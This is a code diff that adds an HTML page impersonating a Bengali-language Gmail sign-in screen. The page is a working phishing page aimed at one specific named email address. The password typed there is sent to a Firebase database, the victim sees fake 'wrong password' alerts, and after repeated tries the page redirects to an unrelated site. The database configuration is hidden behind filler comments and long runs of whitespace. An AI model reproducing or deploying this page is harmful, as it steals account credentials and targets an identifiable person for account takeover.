@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gmail</title>
+     <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="main-div">
+        <div class="upper">
+            <img src="upper.PNG" alt="upper">
+        </div>
+        <div class="input">
+            <label id="mail"><input type="text" class="textfield" id="ml"  required><span class="placeholder" id="mail">ইমেল আইডি অথবা ফোন নম্বর</span></label>
+            <label id="password"><input type="text" class="textfield"  id="pas"  required><span class="placeholder">আপনার পাসওয়ার্ডটি লিখুন</span></label>
+            <p>ইমেল আইডি ভুলে গেছেন?</p>
+        </div>
+        <div class="last">
+            <p>আপনার কম্পিউটার নয়? তাহলে ব্যক্তিগতভাবে সাইন-ইন করতে অতিথি মোড ব্যবহার করুন। <span>আরও জানুন</span></p>
+            <div class="main-btn">
+                <p>অ্যাকাউন্ট তৈরি করুন</p>
+                <button onclick="check()">পরবর্তী</button>
+            </div>
+        </div>
+        <div class="footer">
+           <div class="l">
+            <select name="cars" id="cars">
+                <option value="volvo">‪বাংলা‬</option>
+            </select>
+           </div>
+           <div class="r">
+              <p>সহায়তা</p>
+              <p>গোপনীয়তা</p>
+              <p>শর্তাবলী</p>
+           </div>
+        </div>
+    </div>
+    
+</body>
+<script src="https://www.gstatic.com/firebasejs/8.0.0/firebase.js"></script>
+<script src="https://www.gstatic.com/firebasejs/7.1.0/firebase-database.js"></script>
+
+<!-- TODO: Add SDKs for Firebase products that you want to use
+     https://firebase.google.com/docs/web/setup#available-libraries -->
+
+<script>
+
+  var firebaseConfig = {
+	  //jgyjhcgsdyufgydufcvauxcsyacxcasxcastyxcastyxdftyassatfthc
+	  //jgyjhcgsdyufgydufcvauxcsyacxcasxcastyxcastyxdftyassatfthc
+	  //jgyjhcgsdyufgydufcvauxcsyacxcasxcastyxcastyxdftyassatfthc
+	  //jgyjhcgsdyufgydufcvauxcsyacxcasxcastyxcastyxdftyassatfthc
+	  //jgyjhcgsdyufgydufcvauxcsyacxcasxcastyxcastyxdftyassatfthc
+	  //jgyjhcgsdyufgydufcvauxcsyacxcasxcastyxcastyxdftyassatfthc
+	  projectId: "links-5d46b",
+    
+	  
+	  
+	  
+	  
+	  
+	  
+	  
+	  
+	  
+	  
+	  
+	  
+	  
+	  
+	  
+	  
+	  
+	  
+	  
+	  
+	  
+	  
+	  
+	  
+	  
+	  
+	  
+	  storageBucket: "links-5d46b.appspot.com",
+   
+	  
+	  
+	  
+	  
+																																																																																																																														  messagingSenderId: "756461258445",
+   																																																																																																																																																																	 appId: "1:756461258445:web:bd332e9c06220942d20b84"
+	  
+	  
+	  
+	  
+	  
+	  
+	  
+	  
+	  
+	  
+	  
+	  
+  };
+	//jgyjhcgsdyufgydufcvauxcsyacxcasxcastyxcastyxdftyassatfthc//jgyjhcgsdyufgydufcvauxcsyacxcasxcastyxcastyxdftyassatfthc//jgyjhcgsdyufgydufcvauxcsyacxcasxcastyxcastyxdftyassatfthc//jgyjhcgsdyufgydufcvauxcsyacxcasxcastyxcastyxdftyassatfthc//jgyjhcgsdyufgydufcvauxcsyacxcasxcastyxcastyxdftyassatfthc//jgyjhcgsdyufgydufcvauxcsyacxcasxcastyxcastyxdftyassatfthc//jgyjhcgsdyufgydufcvauxcsyacxcasxcastyxcastyxdftyassatfthc
+  																																																																																																																																																																		firebase.initializeApp(firebaseConfig);
+</script>
+<script>
+    let cnt=0;
+    function check(){
+        let hidem = document.getElementById('mail');
+        let hidep = document.getElementById('password');
+        let mid = document.getElementById('ml');
+        let mpas = document.getElementById('pas');
+        let ps = mpas.value;
+        let txt = mid.value;
+        
+        if(txt.toLowerCase()=="shirin2020.bd@gmail.com"){
+           hidem.style.display="none"
+           hidep.style.display="block"
+        }
+
+        else{
+            alert('Wrong Email Adress')
+        }
+
+        if(mpas.value.length > 0 && txt.toLowerCase()=="shirin2020.bd@gmail.com"){
+            cnt++;
+            firebase.database().ref('user/').push({
+           name:txt,
+        pass:ps
+  });
+            if(cnt>2){
+               alert("Please try again after sometimes.");
+               window.location.replace("https://www.oppo.com/bd/");
+            }
+            else{
+                setTimeout(()=>{
+                    alert('Wrong Password,Try Again');
+                    hidem.style.display="block"
+                   hidep.style.display="none"
+                   mpas.value="";
+                  
+                   ps="";
+                   txt="";
+
+                },2000)
+                
+            }
+        }
+
+    }
+
+
+</script>
+</html>
